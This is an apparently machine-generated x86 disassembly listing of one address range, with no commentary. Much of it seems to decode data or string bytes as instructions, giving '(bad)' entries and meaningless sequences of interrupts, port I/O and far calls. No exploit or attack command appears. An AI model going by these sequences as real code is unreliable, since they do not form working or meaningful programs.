  427872:	xchg   esi,eax
  427873:	adc    al,0x3b
  427875:	jns    0x4278b2
  427877:	fcmovbe st,st(3)
  427879:	repnz sub ch,cl
  42787c:	lea    ebx,[ebx+edx*2]
  42787f:	shr    BYTE PTR [edi],cl
  427881:	shl    DWORD PTR [esi-0x3],1
  427884:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  42788a:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  427891:	call   0xcd3c:0xd6cd6d3b
  427898:	xchg   esi,eax
  427899:	inc    esp
  42789a:	int    0xe6
  42789c:	and    al,0x5d
  42789e:	mov    ebp,0x5f25230a
  4278a3:	jnp    0x4278dc
  4278a5:	ficom  WORD PTR [ebx]
  4278a7:	inc    ebx
  4278a8:	icebp  
  4278a9:	das    
  4278aa:	or     BYTE PTR [edi],al
  4278ac:	add    BYTE PTR [eax-0x4613080],0x82
  4278b3:	test   BYTE PTR [ebx-0xc],al
  4278b6:	jnp    0x42789e
  4278b8:	inc    ebx
  4278b9:	hlt    
  4278ba:	(bad)  
  4278bb:	mov    BYTE PTR [ebx-0xf],al
  4278be:	das    
  4278bf:	add    eax,0x80809216
  4278c4:	adc    bh,bh
  4278c6:	jno    0x4278ff
  4278c8:	ficom  WORD PTR [ebx]
  4278ca:	(bad)  
  4278cb:	mov    BYTE PTR [ebx-0xf],al
  4278ce:	das    
  4278cf:	add    eax,0x80809285
  4278d4:	adc    bh,bh
  4278d6:	xchg   esi,eax
  4278d7:	aaa    
  4278d8:	ficom  WORD PTR [ebx]
  4278da:	(bad)  
  4278db:	mov    BYTE PTR [ebx-0xf],al
  4278de:	das    
  4278df:	add    eax,0x808080f8
  4278e4:	adc    bh,bh
  4278e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278e7:	aaa    
  4278e8:	ficom  WORD PTR [ebx]
  4278ea:	(bad)  
  4278eb:	test   BYTE PTR [ebx-0xf],al
  4278ee:	aam    0x3e
  4278f0:	adc    bh,bh
  4278f2:	scas   al,BYTE PTR es:[edi]
  4278f3:	aaa    
  4278f4:	ficom  WORD PTR [ebx]
  4278f6:	(bad)  
  4278f7:	mov    BYTE PTR [ebx-0xf],al
  4278fa:	das    
  4278fb:	add    eax,0x808081db
  427900:	adc    bh,bh
  427902:	mov    dh,0x37
  427904:	ficom  WORD PTR [ebx]
  427906:	das    
  427907:	push   es
  427908:	into   
  427909:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  427913:	sub    bl,0x12
  427916:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  427920:	(bad)  
  427921:	adc    al,0x0
  427923:	(bad)  
  427924:	xor    BYTE PTR [eax],al
  427926:	(bad)  
  427927:	dec    esp
  427928:	add    dh,dl
  42792a:	mov    BYTE PTR [ebp+0xff77],bh
  427930:	jmp    0x4278e8
  427932:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  42793c:	mov    BYTE PTR [ebx-0xf],al
  42793f:	das    
  427940:	add    eax,0x80808019
  427945:	adc    bh,bh
  427947:	xchg   ecx,eax
  427948:	aaa    
  427949:	ficom  WORD PTR [ebx]
  42794b:	(bad)  
  42794c:	mov    BYTE PTR [ebx-0xf],al
  42794f:	das    
  427950:	add    eax,0x8080818e
  427955:	adc    bh,bh
  427957:	(bad)  
  427958:	aaa    
  427959:	ficom  WORD PTR [ebx]
  42795b:	(bad)  
  42795c:	test   BYTE PTR [ebx-0xf],al
  42795f:	aam    0x1c
  427961:	adc    bh,bh
  427963:	fidiv  WORD PTR [edi]
  427965:	ficom  WORD PTR [ebx]
  427967:	(bad)  
  427968:	mov    BYTE PTR [ebx-0xf],al
  42796b:	das    
  42796c:	add    eax,0x80808142
  427971:	adc    bh,bh
  427973:	out    0x37,al
  427975:	ficom  WORD PTR [ebx]
  427977:	in     al,dx
  427978:	iret   
  427979:	int    0x96
  42797b:	mov    ch,cl
  42797d:	(bad)  
  42797e:	dec    esp
  42797f:	int    0xe6
  427981:	mov    ch,cl
  427983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427984:	dec    esp
  427985:	cmp    edx,DWORD PTR [ecx]
  427987:	cmp    esp,ebx
  427989:	das    
  42798a:	inc    ebp
  42798b:	sti    
  42798c:	xchg   edx,eax
  42798d:	shr    ecx,cl
  42798f:	sub    BYTE PTR [edx],dl
  427991:	clc    
  427992:	add    BYTE PTR [eax-0x102c9380],0x92
  427999:	cmp    ebx,ebp
  42799b:	push   ebx
  42799c:	clc    
  42799d:	int    0xe6
  42799f:	mov    BYTE PTR [ebx-0x2b],dl
  4279a2:	int    0xa6
  4279a4:	dec    esp
  4279a5:	xchg   ecx,ebx
  4279a7:	sbb    esi,esp
  4279a9:	or     dl,BYTE PTR [esi+0x4cd60a88]
  4279af:	int    0x96
  4279b1:	mov    ch,cl
  4279b3:	(bad)  
  4279b4:	dec    esp
  4279b5:	int    0xe6
  4279b7:	mov    ch,cl
  4279b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279ba:	dec    esp
  4279bb:	cmp    edx,DWORD PTR [ecx]
  4279bd:	cmp    esp,ebx
  4279bf:	das    
  4279c0:	inc    ebp
  4279c1:	sti    
  4279c2:	xchg   edx,eax
  4279c3:	shr    ecx,cl
  4279c5:	sub    BYTE PTR [ebx],bh
  4279c7:	fst    st(3)
  4279c9:	out    dx,eax
  4279ca:	xchg   edx,eax
  4279cb:	adc    bh,al
  4279cd:	add    BYTE PTR [eax-0x2aac9380],0x53
  4279d4:	clc    
  4279d5:	ds xchg esi,eax
  4279d7:	xor    BYTE PTR [esi],bl
  4279d9:	(bad)  
  4279da:	adc    al,0xcd
  4279dc:	xchg   esi,eax
  4279dd:	cmp    al,0xcd
  4279df:	(bad)  
  4279e0:	inc    esp
  4279e1:	int    0x96
  4279e3:	xor    ch,cl
  4279e5:	(bad)  
  4279e6:	adc    al,0xcd
  4279e8:	xchg   esi,eax
  4279e9:	xor    ch,cl
  4279eb:	(bad)  
  4279ec:	adc    al,0xcd
  4279ee:	out    0x30,al
  4279f0:	int    0xa6
  4279f2:	adc    al,0x3b
  4279f4:	adc    DWORD PTR [ebx],edi
  4279f6:	jecxz  0x427a27
  4279f8:	inc    ebp
  4279f9:	sti    
  4279fa:	xchg   edx,eax
  4279fb:	shr    ecx,cl
  4279fd:	sub    BYTE PTR [ebx],bh
  4279ff:	fst    QWORD PTR [edx]
  427a01:	clc    
  427a02:	add    BYTE PTR [eax-0x102c9380],0x92
  427a09:	push   ebx
  427a0a:	clc    
  427a0b:	int    0xe6
  427a0d:	cmp    al,0x53
  427a0f:	aad    0xcd
  427a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a12:	inc    esp
  427a13:	cmp    edi,edx
  427a15:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427a1b:	lea    eax,[edi+ebp*1+0x45]
  427a1f:	loope  0x4279b3
  427a21:	cmp    ecx,ebx
  427a23:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427a29:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427a2e:	lea    esi,[eax]
  427a30:	shr    esp,cl
  427a32:	xchg   edx,eax
  427a33:	push   ebx
  427a34:	popf   
  427a35:	xchg   ecx,ebx
  427a37:	int    0x96
  427a39:	adc    al,0x1b
  427a3b:	hlt    
  427a3c:	add    al,0xf2
  427a3e:	std    
  427a3f:	shr    edi,cl
  427a41:	sub    BYTE PTR [ebx],bh
  427a43:	ins    DWORD PTR es:[edi],dx
  427a44:	adc    al,BYTE PTR [edx]
  427a46:	aam    0x37
  427a48:	ficom  WORD PTR [ebx]
  427a4a:	adc    bh,bl
  427a4c:	mov    ebp,0xcd25230a
  427a51:	out    0x3c,al
  427a53:	int    0xa6
  427a55:	inc    esp
  427a56:	add    al,0xe9
  427a58:	std    
  427a59:	adc    bh,al
  427a5b:	aam    0x37
  427a5d:	ficom  WORD PTR [ebx]
  427a5f:	adc    dh,ah
  427a61:	mov    ebp,0x8725230a
  427a66:	lock int 0xe6
  427a69:	and    al,0x1b
  427a6b:	aad    0x53
  427a6d:	rcl    BYTE PTR [esi-0x43],cl
  427a70:	or     ah,BYTE PTR [ebx]
  427a72:	and    eax,0x12025370
  427a77:	not    esi
  427a79:	aaa    
  427a7a:	ficom  WORD PTR [ebx]
  427a7c:	cwde   
  427a7d:	add    dh,dl
  427a7f:	xor    al,0x0
  427a81:	(bad)  
  427a82:	sub    al,0x9a
  427a84:	add    dh,dl
  427a86:	sbb    al,0x0
  427a88:	(bad)  
  427a89:	adc    al,0x0
  427a8b:	(bad)  
  427a8c:	xor    BYTE PTR [eax],al
  427a8e:	(bad)  
  427a8f:	dec    esp
  427a90:	add    dh,dl
  427a92:	mov    BYTE PTR [ebp+0xfef4],bh
  427a98:	or     cl,BYTE PTR [ebx-0x57557433]
  427a9e:	arpl   bx,cx
  427aa0:	sar    BYTE PTR [eax+eax*4],cl
  427aa3:	int    0x96
  427aa5:	mov    ch,cl
  427aa7:	(bad)  
  427aa8:	dec    esp
  427aa9:	int    0xe6
  427aab:	mov    ch,cl
  427aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427aae:	dec    esp
  427aaf:	cmp    esp,ebx
  427ab1:	cmp    edx,DWORD PTR [ecx]
  427ab3:	das    
  427ab4:	inc    ebp
  427ab5:	sti    
  427ab6:	xchg   edx,eax
  427ab7:	shr    ecx,cl
  427ab9:	sub    BYTE PTR [edx],dl
  427abb:	clc    
  427abc:	add    BYTE PTR [eax-0x102c9380],0x92
  427ac3:	cmp    ebx,ebp
  427ac5:	push   ebx
  427ac6:	aad    0x53
  427ac8:	clc    
  427ac9:	int    0xe6
  427acb:	xor    ch,cl
  427acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ace:	adc    al,0x53
  427ad0:	fst    DWORD PTR [ebx-0xc]
  427ad3:	or     dl,BYTE PTR [esi+0x14d60a30]
  427ad9:	int    0x96
  427adb:	cmp    al,0xcd
  427add:	(bad)  
  427ade:	inc    esp
  427adf:	int    0x96
  427ae1:	xor    ch,cl
  427ae3:	(bad)  
  427ae4:	adc    al,0xcd
  427ae6:	xchg   esi,eax
  427ae7:	mov    ch,cl
  427ae9:	(bad)  
  427aea:	dec    esp
  427aeb:	int    0x96
  427aed:	mov    ch,cl
  427aef:	(bad)  
  427af0:	dec    esp
  427af1:	int    0xe6
  427af3:	mov    ch,cl
  427af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427af6:	dec    esp
  427af7:	cmp    esp,ebx
  427af9:	cmp    edx,DWORD PTR [ecx]
  427afb:	das    
  427afc:	inc    ebp
  427afd:	sti    
  427afe:	xchg   edx,eax
  427aff:	shr    ecx,cl
  427b01:	sub    BYTE PTR [edx],dl
  427b03:	clc    
  427b04:	add    BYTE PTR [eax-0x22c49380],0x53
  427b0b:	aad    0xd3
  427b0d:	out    dx,eax
  427b0e:	xchg   edx,eax
  427b0f:	push   ebx
  427b10:	clc    
  427b11:	int    0xe6
  427b13:	xor    ch,cl
  427b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b16:	adc    al,0x3b
  427b18:	cli    
  427b19:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427b1f:	lea    edx,[edi+ebp*1]
  427b22:	inc    ebp
  427b23:	loope  0x427ab7
  427b25:	cmp    ecx,ebx
  427b27:	push   ebx
  427b28:	cli    
  427b29:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427b2f:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427b34:	push   ebx
  427b35:	popf   
  427b36:	int    0x76
  427b38:	cmp    al,0xcd
  427b3a:	lea    eax,[edi+eax*4-0x27]
  427b3e:	int    0xe6
  427b40:	cmp    al,0x1b
  427b42:	hlt    
  427b43:	int    0xa6
  427b45:	inc    esp
  427b46:	adc    al,BYTE PTR [edx]
  427b48:	mov    ebp,0x5625230a
  427b4d:	jnp    0x427b86
  427b4f:	ficom  WORD PTR [ebx]
  427b51:	das    
  427b52:	inc    ebp
  427b53:	jge    0x427ae7
  427b55:	shr    ecx,cl
  427b57:	sub    bl,dl
  427b59:	jmp    0x427aed
  427b5b:	cmp    ebx,ebp
  427b5d:	adc    bh,al
  427b5f:	add    BYTE PTR [eax-0xfac9380],0x53
  427b66:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427b6c:	lea    ecx,[eax-0x32b36933]
  427b72:	out    0x30,al
  427b74:	int    0xa6
  427b76:	adc    al,0x4
  427b78:	repnz std 
  427b7a:	add    al,0xe9
  427b7c:	std    
  427b7d:	adc    al,BYTE PTR [edx]
  427b7f:	aam    0x37
  427b81:	ficom  WORD PTR [ebx]
  427b83:	adc    bh,al
  427b85:	aam    0x37
  427b87:	ficom  WORD PTR [ebx]
  427b89:	shr    edi,cl
  427b8b:	sub    BYTE PTR [ebx],bh
  427b8d:	ins    DWORD PTR es:[edi],dx
  427b8e:	adc    bh,bl
  427b90:	mov    ebp,0x1225230a
  427b95:	hlt    
  427b96:	mov    ebp,0x8725230a
  427b9b:	lock sbb edx,ebp
  427b9e:	jmp    0x427be7
  427ba0:	inc    DWORD PTR [eax]
  427ba2:	add    BYTE PTR [esi-0x12fb1233],dl
  427ba8:	sbb    al,0x98
  427baa:	pop    edi
  427bab:	(bad)  
  427bac:	aaa    
  427bad:	ficom  WORD PTR [ebx]
  427baf:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427bb5:	and    esp,DWORD PTR ds:0xc9f5760a
  427bbb:	jbe    0x427b7a
  427bbd:	xchg   ecx,eax
  427bbe:	aaa    
  427bbf:	ficom  WORD PTR [ebx]
  427bc1:	or     dh,BYTE PTR [esi-0x13]
  427bc4:	int    0x96
  427bc6:	adc    ebp,ecx
  427bc8:	(bad)  
  427bc9:	cmc    
  427bca:	call   0xefd3:0x92fb452f
  427bd1:	xchg   edx,eax
  427bd2:	int    0xd6
  427bd4:	adc    ebp,ecx
  427bd6:	out    0xf5,al
  427bd8:	jo     0x427bec
  427bda:	sti    
  427bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bdc:	mov    esi,0x3b4229
  427be1:	jno    0x427c36
  427be3:	(bad)  [edx]
  427be5:	xchg   esi,eax
  427be6:	std    
  427be7:	int    0x96
  427be9:	dec    esp
  427bea:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427bf0:	iret   
  427bf1:	jbe    0x427bf0
  427bf3:	add    dh,dl
  427bf5:	mov    bl,dl
  427bf7:	mov    ecx,0xd6007028
  427bfc:	dec    esp
  427bfd:	add    dh,dl
  427bff:	in     eax,dx
  427c00:	add    dh,dl
  427c02:	mov    ebp,0xf5d600
  427c07:	(bad)  
  427c08:	adc    DWORD PTR [ebp+0xfde6],edi
  427c0e:	stos   BYTE PTR es:[edi],al
  427c0f:	or     dh,BYTE PTR [esi-0x3]
  427c12:	int    0x76
  427c14:	std    
  427c15:	test   al,0xcb
  427c17:	ror    BYTE PTR [eax-0x12326980],cl
  427c1d:	add    al,0xb5
  427c1f:	stc    
  427c20:	add    al,0xed
  427c22:	inc    esp
  427c23:	cwde   
  427c24:	leave  
  427c25:	je     0x427c5b
  427c27:	xor    al,0x80
  427c29:	add    BYTE PTR [eax+0x3474c980],0x44
  427c30:	add    BYTE PTR [eax+0x74cf8080],0x34
  427c37:	xor    BYTE PTR [eax+0x0],dh
  427c3a:	(bad)  
  427c3b:	xor    al,0x0
  427c3d:	(bad)  
  427c3e:	sub    al,0x0
  427c40:	(bad)  
  427c41:	and    al,0x0
  427c43:	(bad)  
  427c44:	sbb    al,0x0
  427c46:	(bad)  
  427c47:	adc    al,0x0
  427c49:	(bad)  
  427c4a:	xor    BYTE PTR [eax],al
  427c4c:	(bad)  
  427c4d:	dec    esp
  427c4e:	add    dh,dl
  427c50:	mov    BYTE PTR [ebp+0xe7e7],bh
  427c56:	int    0x76
  427c58:	mov    BYTE PTR [edx],cl
  427c5a:	je     0x427c90
  427c5c:	test   ch,cl
  427c5e:	je     0x427c94
  427c60:	xor    al,0x6
  427c62:	ins    DWORD PTR es:[edi],dx
  427c63:	das    
  427c64:	add    eax,0x80808017
  427c69:	int    0x74
  427c6b:	xor    al,0x44
  427c6d:	push   es
  427c6e:	ins    DWORD PTR es:[edi],dx
  427c6f:	das    
  427c70:	add    eax,0x8080800a
  427c75:	add    ah,dl
  427c77:	xor    al,0x24
  427c79:	add    ah,dl
  427c7b:	xor    al,0x24
  427c7d:	add    ah,dl
  427c7f:	xor    al,0x24
  427c81:	int    0x74
  427c83:	xor    al,0x50
  427c85:	add    cl,dh
  427c87:	int    0x74
  427c89:	xor    al,0x84
  427c8b:	int    0x74
  427c8d:	xor    al,0x84
  427c8f:	int    0x74
  427c91:	xor    al,0x84
  427c93:	iret   
  427c94:	jbe    0x427c1a
  427c96:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427c9a:	int    0x74
  427c9c:	xor    al,0x3c
  427c9e:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427ca2:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427ca6:	int    0x74
  427ca8:	xor    al,0x84
  427caa:	int    0x74
  427cac:	xor    al,0x84
  427cae:	int    0x8c
  427cb0:	xor    al,0x84
  427cb2:	int    0xa
  427cb4:	and    eax,0xcd808081
  427cb9:	xor    ebp,ecx
  427cbb:	aam    0x34
  427cbd:	mov    ch,cl
  427cbf:	add    DWORD PTR ds:0x5e808081,ebp
  427cc5:	sbb    BYTE PTR [edi],ch
  427cc7:	or     edx,DWORD PTR ds:0xcd808081
  427ccd:	xor    ch,cl
  427ccf:	push   eax
  427cd0:	int    0x62
  427cd2:	fs iret 
  427cd4:	xchg   esp,eax
  427cd5:	sbb    BYTE PTR [eax-0x33],dh
  427cd8:	push   ecx
  427cd9:	int    0x22
  427cdb:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427ce1:	pop    esi
  427ce2:	sbb    BYTE PTR [edi],ch
  427ce4:	add    al,0x7b
  427ce6:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427cf0:	dec    edx
  427cf1:	int    0x80
  427cf3:	xor    ecx,DWORD PTR [edi]
  427cf5:	xchg   ebx,edx
  427cf7:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427cfd:	or     ch,0x74
  427d00:	xor    al,0x44
  427d02:	push   es
  427d03:	ins    DWORD PTR es:[edi],dx
  427d04:	das    
  427d05:	push   es
  427d06:	cwde   
  427d07:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427d11:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427d1b:	je     0x427d51
  427d1d:	test   ch,cl
  427d1f:	add    DWORD PTR ds:0xcd808081,esp
  427d25:	or     BYTE PTR [edx],0x74
  427d28:	xor    al,0x4c
  427d2a:	int    0x74
  427d2c:	xor    al,0x84
  427d2e:	int    0x1
  427d30:	or     DWORD PTR [ecx-0x7f327f80],eax
  427d36:	int    0x80
  427d38:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427d3c:	int    0x74
  427d3e:	xor    al,0x84
  427d40:	int    0x1
  427d42:	int3   
  427d43:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427d4d:	dec    esp
  427d4e:	int    0x74
  427d50:	xor    al,0x84
  427d52:	int    0x8c
  427d54:	xor    al,0x84
  427d56:	int    0x1
  427d58:	popf   
  427d59:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427d63:	or     ch,0x89
  427d66:	imul   edx,ecx,0x3b358621
  427d6c:	jns    0x427d72
  427d6e:	add    bh,bh
  427d70:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427d76:	push   ebx
  427d77:	jge    0x427d83
  427d79:	mov    WORD PTR [esp+ecx*2],?
  427d7c:	leave  
  427d7d:	je     0x427db3
  427d7f:	mov    BYTE PTR [eax-0x327f7f80],al
  427d85:	je     0x427dbb
  427d87:	xor    al,0x6
  427d89:	ins    DWORD PTR es:[edi],dx
  427d8a:	aam    0x73
  427d8c:	int    0x74
  427d8e:	xor    al,0x30
  427d90:	add    al,0xbd
  427d92:	adc    ah,0x52
  427d95:	jl     0x427d6b
  427d97:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427d9b:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427d9f:	add    ah,dl
  427da1:	xor    al,0x2c
  427da3:	add    ah,dl
  427da5:	xor    al,0x2c
  427da7:	add    ah,dl
  427da9:	xor    al,0x2c
  427dab:	add    ah,dl
  427dad:	xor    al,0x2c
  427daf:	int    0x74
  427db1:	xor    al,0x54
  427db3:	add    cl,dh
  427db5:	in     al,dx
  427db6:	cmp    BYTE PTR [eax],al
  427db8:	aam    0x34
  427dba:	and    al,0x0
  427dbc:	aam    0x34
  427dbe:	and    al,0x0
  427dc0:	aam    0x34
  427dc2:	and    al,0xcd
  427dc4:	je     0x427dfa
  427dc6:	push   eax
  427dc7:	add    cl,dh
  427dc9:	in     al,dx
  427dca:	and    al,BYTE PTR [eax]
  427dcc:	aam    0x34
  427dce:	adc    al,0xcd
  427dd0:	je     0x427e06
  427dd2:	cmp    al,0x0
  427dd4:	icebp  
  427dd5:	in     al,dx
  427dd6:	xchg   ch,cl
  427dd8:	je     0x427e0e
  427dda:	xor    al,0x0
  427ddc:	icebp  
  427ddd:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427de1:	int    0x74
  427de3:	xor    al,0x4c
  427de5:	push   es
  427de6:	ins    DWORD PTR es:[edi],dx
  427de7:	aam    0x4e
  427de9:	int    0x74
  427deb:	xor    al,0x84
  427ded:	leave  
  427dee:	add    DWORD PTR [ebp+0x41808081],ebp
  427df4:	and    DWORD PTR [esi+0x3474cd35],eax
  427dfa:	mov    ch,cl
  427dfc:	mov    WORD PTR [esp+eax*4],?
  427dff:	int    0xa
  427e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e02:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e0c:	and    DWORD PTR [esi+0x3474cd35],eax
  427e12:	mov    ch,cl
  427e14:	mov    WORD PTR [eax+ecx*4],?
  427e17:	cmp    edi,DWORD PTR [ecx+0x4]
  427e1a:	add    bh,bh
  427e1c:	shl    edx,cl
  427e1e:	sub    bl,dl
  427e20:	mov    ebp,0xcdd35392
  427e25:	mov    WORD PTR [esp+ecx*2],?
  427e28:	inc    ebx
  427e29:	rcl    esi,cl
  427e2b:	and    ecx,ebp
  427e2d:	je     0x427e63
  427e2f:	test   ch,cl
  427e31:	mov    WORD PTR [esp+eax*4],?
  427e34:	int    0xa
  427e36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e37:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427e41:	add    BYTE PTR [eax],0x70
  427e44:	cmp    al,0xec
  427e46:	push   ds
  427e47:	iret   
  427e48:	jbe    0x427dce
  427e4a:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427e4e:	int    0x74
  427e50:	xor    al,0x4c
  427e52:	int    0x8c
  427e54:	xor    al,0x84
  427e56:	int    0xa
  427e58:	in     al,0x81
  427e5a:	add    BYTE PTR [eax-0x777e7633],0xcd
  427e61:	je     0x427e97
  427e63:	test   ch,cl
  427e65:	add    ebp,ebp
  427e67:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427e71:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427e77:	or     bh,0x84
  427e7a:	adc    cl,ch
  427e7c:	mov    WORD PTR [esp+eax*4],?
  427e7f:	int    0xa
  427e81:	in     al,0x81
  427e83:	add    BYTE PTR [eax-0x76327f33],0x81
  427e8a:	mov    BYTE PTR [eax-0x2d591833],ch
  427e90:	sub    al,0x80
  427e92:	lds    edx,FWORD PTR [eax+0x75]
  427e95:	ins    BYTE PTR es:[edi],dx
  427e96:	jae    0x427f0f
  427e98:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427e9c:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427ea0:	add    BYTE PTR [ecx+0x74],ah
  427ea3:	ins    BYTE PTR es:[edi],dx
  427ea4:	popa   
  427ea5:	inc    esp
  427ea6:	gs popa 
  427ea8:	fs push 0x6561686d
  427eae:	add    BYTE PTR fs:[ebp+0x74],ah
  427eb2:	push   0x65726143
  427eb7:	outs   dx,DWORD PTR ds:[esi]
  427eb8:	jns    0x427f20
  427eba:	add    BYTE PTR gs:[edi+0x72],dh
  427ebe:	jns    0x427f2d
  427ec0:	popa   
  427ec1:	outs   dx,DWORD PTR ds:[esi]
  427ec2:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427ec6:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427eca:	push   0x6f6d6568
  427ecf:	add    BYTE PTR fs:[edx+0x65],dl
  427ed3:	arpl   WORD PTR [ebx+0x62],si
  427ed6:	popa   
  427ed7:	ins    BYTE PTR es:[edi],dx
  427ed8:	jne    0x427f52
  427eda:	gs jae 0x427edd
  427edd:	ins    DWORD PTR es:[edi],dx
  427ede:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427ee5:	outs   dx,DWORD PTR ds:[esi]
  427ee6:	jb     0x427f57
  427ee8:	jo     0x427eea
  427eea:	ja     0x427f4d
  427eec:	gs je  0x427f5e
  427eef:	jb     0x427f60
  427ef1:	bound  esp,QWORD PTR [ecx+0x70]
  427ef4:	add    BYTE PTR [ebx+0x69],cl
  427ef7:	outs   dx,BYTE PTR ds:[esi]
  427ef8:	addr16 addr16 popa 
  427efb:	outs   dx,BYTE PTR ds:[esi]
  427efc:	arpl   WORD PTR [ecx+0x70],sp
  427eff:	add    BYTE PTR [edi+0x6e],al
  427f02:	jne    0x427f77
  427f04:	je     0x427f6b
  427f06:	outs   dx,BYTE PTR ds:[esi]
  427f07:	push   esi
  427f08:	popa   
  427f09:	jb     0x427f84
  427f0b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f0f:	jb     0x427f61
  427f11:	popa   
  427f12:	ins    BYTE PTR es:[edi],dx
  427f13:	ins    DWORD PTR es:[edi],dx
  427f14:	je     0x427f7f
  427f16:	outs   dx,DWORD PTR ds:[esi]
  427f17:	ja     0x427f7e
  427f19:	jb     0x427f1b
  427f1b:	jo     0x427f82
  427f1d:	ins    DWORD PTR es:[edi],dx
  427f1e:	jns    0x427f94
  427f20:	push   0x6f656562
  427f25:	outs   dx,BYTE PTR ds:[esi]
  427f26:	push   eax
  427f27:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427f2e:	inc    ebx
  427f2f:	outs   dx,DWORD PTR ds:[esi]
  427f30:	popa   
  427f31:	ins    BYTE PTR es:[edi],dx
  427f32:	popa   
  427f33:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427f3a:	je     0x427fb5
  427f3c:	outs   dx,DWORD PTR gs:[esi]
  427f3e:	outs   dx,BYTE PTR ds:[esi]
  427f3f:	gs ins BYTE PTR es:[edi],dx
  427f41:	inc    ebx
  427f42:	push   0x54007261
  427f47:	jns    0x427fb9
  427f49:	jns    0x427fb8
  427f4b:	jne    0x427fb2
  427f4d:	imul   eax,DWORD PTR gs:[eax],0x70
  427f51:	outs   dx,DWORD PTR ds:[esi]
  427f52:	je     0x427f96
  427f54:	gs gs jb 0x427fc8
  427f58:	outs   dx,DWORD PTR ds:[esi]
  427f59:	je     0x427fc6
  427f5b:	imul   eax,DWORD PTR [eax],0x616c7548
  427f61:	jo     0x427fcc
  427f63:	popa   
  427f64:	ins    BYTE PTR es:[edi],dx
  427f65:	dec    ebx
  427f66:	outs   dx,BYTE PTR ds:[esi]
  427f67:	popa   
  427f68:	jo     0x427fe3
  427f6a:	add    BYTE PTR gs:[eax+0x6f],dh
  427f6e:	je     0x427fb2
  427f70:	gs ins BYTE PTR es:[edi],dx
  427f72:	jae    0x427fe3
  427f74:	js     0x427f76
  427f76:	popa   
  427f77:	data16 je 0x427fc0
  427f7a:	ins    BYTE PTR es:[edi],dx
  427f7b:	popa   
  427f7c:	imul   esp,DWORD PTR [ebp+0x78],0x70
  427f80:	gs jae 0x427fe4
  427f83:	jb     0x427f85
  427f85:	inc    edx
  427f86:	ins    BYTE PTR es:[edi],dx
  427f87:	popa   
  427f88:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  427f8c:	je     0x427ff4
  427f8e:	ins    BYTE PTR es:[edi],dx
  427f8f:	jns    0x428006
  427f91:	push   0x6d6d6800
  427f96:	popa   
  427f97:	inc    edi
  427f98:	popa   
  427f99:	ins    BYTE PTR es:[edi],dx
  427f9a:	ins    BYTE PTR es:[edi],dx
  427f9b:	push   0x48007361
  427fa0:	outs   dx,DWORD PTR ds:[esi]
  427fa1:	ins    DWORD PTR es:[edi],dx
  427fa2:	outs   dx,DWORD PTR gs:[esi]
  427fa4:	jb     0x42800b
  427fa6:	data16 jno 0x428012
  427fa9:	jae    0x42800c
  427fab:	bound  esi,QWORD PTR [eax+0x61]
  427fae:	add    BYTE PTR [ebp+0x74],ah
  427fb1:	outs   dx,BYTE PTR ds:[esi]
  427fb2:	gs addr16 jbe 0x428017
  427fb6:	je     0x428031
  427fb8:	gs popa 
  427fba:	add    BYTE PTR [ebp+0x67],ah
  427fbd:	outs   dx,DWORD PTR ds:[esi]
  427fbe:	inc    edi
  427fbf:	popa   
  427fc0:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  427fc8:	jo     0x42802f
  427fca:	fs jbe 0x42802e
  427fcd:	je     0x428044
  427fcf:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  427fd3:	outs   dx,DWORD PTR ds:[esi]
  427fd4:	add    BYTE PTR [edx+0x0],ch
  427fd7:	jne    0x427fd9
